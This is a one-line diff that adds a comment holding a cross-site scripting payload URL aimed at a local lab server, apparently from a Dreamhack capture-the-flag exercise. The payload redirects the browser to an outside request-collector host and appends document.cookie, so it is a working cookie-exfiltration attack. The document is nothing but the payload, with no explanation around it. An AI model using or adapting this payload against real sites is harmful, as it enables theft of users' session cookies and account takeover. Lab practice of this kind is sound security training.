@@ -1,0 +1,1 @@
+# http://127.0.0.1:8000/xss/?payload=<div data-code="1"></div>#location.href='https://bkhpigm.request.dreamhack.games/?memo='+document.cookie;
